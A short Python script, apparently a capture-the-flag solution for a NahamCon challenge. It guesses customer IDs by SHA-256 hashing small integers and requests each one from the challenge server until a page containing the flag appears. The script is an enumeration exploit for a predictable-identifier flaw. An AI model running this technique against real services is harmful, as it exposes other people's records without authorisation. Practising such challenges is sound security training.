#!/usr/bin/env python3

import requests
from hashlib import sha256

url = "http://challenge.nahamcon.com:31646"
for i in range(10):
	customer_id = sha256(str(i).encode('utf-8')).hexdigest()
	response = requests.get(f"{url}/{customer_id}")
	if "flag" in response.text:
		print(response.text)
		break